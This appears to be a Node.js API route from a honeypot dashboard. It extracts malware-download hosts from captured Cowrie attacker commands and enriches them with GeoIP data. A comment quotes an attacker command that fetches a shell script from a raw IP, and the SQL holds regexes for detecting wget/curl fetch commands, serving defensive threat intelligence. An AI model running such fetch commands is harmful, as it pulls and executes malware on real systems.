/**
 * Payload delivery infrastructure.
 *
 * Attackers who get a shell almost always fetch a second stage, and the URL
 * they fetch it from is sitting in plain text inside the captured commands.
 * Nothing was reading it. The commands panel showed
 * `wget http://35.237.91.38/x.sh` as a string; this pulls the host out,
 * enriches it with the same GeoIP data used everywhere else, and reports it
 * as what it actually is — a machine serving malware.
 *
 * Worth knowing what this surfaces in practice: several of the busiest hosts
 * sit in Google Cloud ranges. Hosting second stages on reputable cloud
 * infrastructure is a deliberate choice, because blocking by IP reputation
 * does not catch it.
 */

const { pool } = require('../db');
const { lookupGeo } = require('../geo');
const { cached } = require('../cache');
const { extractUrls, hostOf, isIp } = require('../lib/urls');

/**
 * GET /api/public/cowrie/payload-hosts
 *
 * Response: { rows: [{ host, is_ip, country_iso, asn, org, urls, url_count,
 *                      commands, first_seen, last_seen }], total }
 */
module.exports = function registerInfrastructureRoutes(app) {
  app.get('/api/public/cowrie/payload-hosts', async (req, res) => {
    const rawLimit = parseInt(req.query.limit, 10);
    const limit = Math.min(Math.max(Number.isFinite(rawLimit) ? rawLimit : 25, 1), 200);

    const cacheKey = `payload-hosts:${limit}`;

    try {
      const payload = await cached(cacheKey, async () => {
        // One row per unique command, and only the few thousand that contain a
        // fetch at all — a trivial scan, not a pass over cowrie_events.
        const { rows } = await pool.query(
          `SELECT command, first_seen, last_seen, COALESCE(total_events, 0) AS total
             FROM cowrie_unique_commands
            WHERE command ~* '(https?|ftp|tftp)://'
               OR command ~* '(wget|curl|tftp|fetch)\\s+(-[^ ]+ )*([0-9]{1,3}\\.){3}[0-9]{1,3}'
            LIMIT 5000`
        );

        const byHost = new Map();
        for (const row of rows) {
          for (const url of extractUrls(row.command || '')) {
            const host = hostOf(url);
            if (!host) continue;
            let entry = byHost.get(host);
            if (!entry) {
              entry = {
                host,
                is_ip: isIp(host),
                urls: new Set(),
                commands: 0,
                attempts: 0,
                first_seen: row.first_seen,
                last_seen: row.last_seen,
              };
              byHost.set(host, entry);
            }
            entry.urls.add(url);
            entry.commands += 1;
            entry.attempts += Number(row.total) || 0;
            if (row.first_seen && row.first_seen < entry.first_seen) entry.first_seen = row.first_seen;
            if (row.last_seen && row.last_seen > entry.last_seen) entry.last_seen = row.last_seen;
          }
        }

        const out = [...byHost.values()]
          .map((e) => {
            // Only IP hosts can be geo-enriched; a domain would need resolving,
            // and resolving attacker-controlled names from this box is not
            // something to do on a page request.
            const geo = e.is_ip ? lookupGeo(e.host) || {} : {};
            return {
              host: e.host,
              is_ip: e.is_ip,
              country_iso: geo.country_iso ?? null,
              asn: geo.asn ?? null,
              org: geo.org ?? null,
              url_count: e.urls.size,
              // Cap the sample: some hosts serve dozens of near-identical paths.
              urls: [...e.urls].slice(0, 10),
              commands: e.commands,
              attempts: e.attempts,
              first_seen: e.first_seen,
              last_seen: e.last_seen,
            };
          })
          .sort((a, b) => b.url_count - a.url_count || b.attempts - a.attempts);

        return { rows: out.slice(0, limit), total: out.length };
      });
      res.json(payload);
    } catch (err) {
      console.error('Error in /api/public/cowrie/payload-hosts:', err);
      res.status(500).json({ error: 'Database query failed' });
    }
  });
};
